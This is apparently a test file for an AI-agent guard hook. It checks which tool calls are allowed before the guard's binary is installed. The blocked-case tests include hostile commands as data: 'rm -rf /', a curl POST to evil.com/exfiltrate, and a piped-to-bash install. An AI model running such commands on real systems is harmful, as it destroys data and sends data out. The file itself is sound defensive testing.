// Tests for bootstrap detection logic (AgentGuardHQ/agentguard#995)
// Verifies that install/build commands and read-only tools are allowed through
// when the AgentGuard kernel binary is not yet available.

import { describe, it, expect } from 'vitest';
import { isBootstrapSafeAction } from '../src/commands/claude-hook.js';
import {
  claudeHookWrapper,
  BOOTSTRAP_COMMANDS,
  BOOTSTRAP_SAFE_TOOLS,
} from '../src/templates/scripts.js';

// ---------------------------------------------------------------------------
// isBootstrapSafeAction — TypeScript-level bootstrap detection
// ---------------------------------------------------------------------------

describe('isBootstrapSafeAction', () => {
  describe('read-only tools', () => {
    it('allows Read tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Read',
          tool_input: { file_path: '/project/package.json' },
        })
      ).toBe(true);
    });

    it('allows Glob tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Glob',
          tool_input: { pattern: '**/*.ts' },
        })
      ).toBe(true);
    });

    it('allows Grep tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Grep',
          tool_input: { pattern: 'bootstrap' },
        })
      ).toBe(true);
    });

    it('allows LS tool', () => {
      expect(isBootstrapSafeAction({ tool_name: 'LS', tool_input: {} })).toBe(true);
    });

    it('allows WebSearch tool', () => {
      expect(
        isBootstrapSafeAction({ tool_name: 'WebSearch', tool_input: { query: 'test' } })
      ).toBe(true);
    });

    it('allows WebFetch tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'WebFetch',
          tool_input: { url: 'https://example.com' },
        })
      ).toBe(true);
    });
  });

  describe('bootstrap Bash commands', () => {
    it('allows pnpm install', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'pnpm install' },
        })
      ).toBe(true);
    });

    it('allows pnpm i', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'pnpm i' },
        })
      ).toBe(true);
    });

    it('allows npm install', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'npm install' },
        })
      ).toBe(true);
    });

    it('allows npm ci', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'npm ci' },
        })
      ).toBe(true);
    });

    it('allows yarn install', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'yarn install' },
        })
      ).toBe(true);
    });

    it('allows pnpm build', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'pnpm build' },
        })
      ).toBe(true);
    });

    it('allows npm run build', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'npm run build' },
        })
      ).toBe(true);
    });

    it('allows pnpm install with flags', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'pnpm install --frozen-lockfile' },
        })
      ).toBe(true);
    });

    it('allows npm ci with flags', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'npm ci --ignore-scripts' },
        })
      ).toBe(true);
    });
  });

  describe('non-bootstrap actions are blocked', () => {
    it('blocks Write tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Write',
          tool_input: { file_path: '/project/src/main.ts', content: 'hello' },
        })
      ).toBe(false);
    });

    it('blocks Edit tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Edit',
          tool_input: { file_path: '/project/src/main.ts' },
        })
      ).toBe(false);
    });

    it('blocks arbitrary Bash commands', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'rm -rf /' },
        })
      ).toBe(false);
    });

    it('blocks git push', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'git push origin main' },
        })
      ).toBe(false);
    });

    it('blocks curl commands', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'curl -X POST https://evil.com/exfiltrate' },
        })
      ).toBe(false);
    });

    it('blocks commands that contain install but are not pure install', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: { command: 'echo "pnpm install" | bash' },
        })
      ).toBe(false);
    });

    it('blocks empty tool_name', () => {
      expect(isBootstrapSafeAction({})).toBe(false);
    });

    it('blocks Bash with no command', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Bash',
          tool_input: {},
        })
      ).toBe(false);
    });

    it('blocks Agent tool', () => {
      expect(
        isBootstrapSafeAction({
          tool_name: 'Agent',
          tool_input: { prompt: 'do something' },
        })
      ).toBe(false);
    });
  });
});

// ---------------------------------------------------------------------------
// claudeHookWrapper template — shell-level bootstrap detection
// ---------------------------------------------------------------------------

describe('claudeHookWrapper template', () => {
  describe('installed package mode (non-local)', () => {
    it('generates bootstrap exemption block when binary is missing', () => {
      const wrapper = claudeHookWrapper('agentguard', ' --store sqlite', '');
      // Should contain bootstrap detection logic
      expect(wrapper).toContain('BOOTSTRAP_SAFE=0');
      expect(wrapper).toContain('BOOTSTRAP_SAFE=1');
      expect(wrapper).toContain('pnpm install');
      expect(wrapper).toContain('permissionDecision');
      expect(wrapper).toContain('AgentGuardHQ/agentguard#995');
    });

    it('includes all bootstrap command patterns', () => {
      const wrapper = claudeHookWrapper('agentguard', ' --store sqlite', '');
      for (const cmd of BOOTSTRAP_COMMANDS) {
        expect(wrapper).toContain(cmd);
      }
    });

    it('includes all bootstrap-safe tool patterns', () => {
      const wrapper = claudeHookWrapper('agentguard', ' --store sqlite', '');
      for (const tool of BOOTSTRAP_SAFE_TOOLS) {
        expect(wrapper).toContain(tool);
      }
    });

    it('still blocks non-bootstrap actions when binary is missing', () => {
      const wrapper = claudeHookWrapper('agentguard', ' --store sqlite', '');
      // Should still have the fail-closed block for non-bootstrap actions
      expect(wrapper).toContain('"decision":"block"');
      expect(wrapper).toContain('kernel binary not found');
    });
  });

  describe('local dev mode', () => {
    it('uses direct binary path without bootstrap detection', () => {
      const wrapper = claudeHookWrapper('node apps/cli/dist/bin.js', ' --store sqlite', '');
      // Local dev mode sets AGENTGUARD_BIN directly — no need for bootstrap detection
      expect(wrapper).toContain('AGENTGUARD_BIN="node apps/cli/dist/bin.js"');
      // Should NOT have the binary resolution block
      expect(wrapper).not.toContain('node_modules/.bin/agentguard');
    });
  });
});

// ---------------------------------------------------------------------------
// Exported constants
// ---------------------------------------------------------------------------

describe('bootstrap constants', () => {
  it('BOOTSTRAP_COMMANDS includes essential install commands', () => {
    expect(BOOTSTRAP_COMMANDS).toContain('pnpm install');
    expect(BOOTSTRAP_COMMANDS).toContain('npm install');
    expect(BOOTSTRAP_COMMANDS).toContain('npm ci');
    expect(BOOTSTRAP_COMMANDS).toContain('yarn install');
  });

  it('BOOTSTRAP_COMMANDS includes build commands', () => {
    expect(BOOTSTRAP_COMMANDS).toContain('pnpm build');
    expect(BOOTSTRAP_COMMANDS).toContain('npm run build');
  });

  it('BOOTSTRAP_SAFE_TOOLS includes read-only tools', () => {
    expect(BOOTSTRAP_SAFE_TOOLS).toContain('Read');
    expect(BOOTSTRAP_SAFE_TOOLS).toContain('Glob');
    expect(BOOTSTRAP_SAFE_TOOLS).toContain('Grep');
  });

  it('BOOTSTRAP_SAFE_TOOLS does not include write tools', () => {
    expect(BOOTSTRAP_SAFE_TOOLS).not.toContain('Write');
    expect(BOOTSTRAP_SAFE_TOOLS).not.toContain('Edit');
    expect(BOOTSTRAP_SAFE_TOOLS).not.toContain('Bash');
  });
});
